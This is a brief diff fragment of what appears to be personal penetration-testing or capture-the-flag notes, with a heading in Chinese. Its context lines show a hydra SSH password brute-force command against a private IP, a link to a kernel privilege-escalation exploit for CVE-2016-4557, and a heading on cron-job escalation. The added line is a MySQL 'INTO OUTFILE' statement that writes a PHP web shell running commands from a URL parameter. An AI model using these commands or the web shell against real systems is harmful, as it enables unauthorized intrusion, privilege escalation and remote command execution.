@@ -62,3 +62,5 @@ hydra -L users.txt -P users.txt 192.168.69.148 ssh
 [CVE-2016-4557] double-fdput()
 https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
 6.定時任務提權
+
+Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/tmp/test";
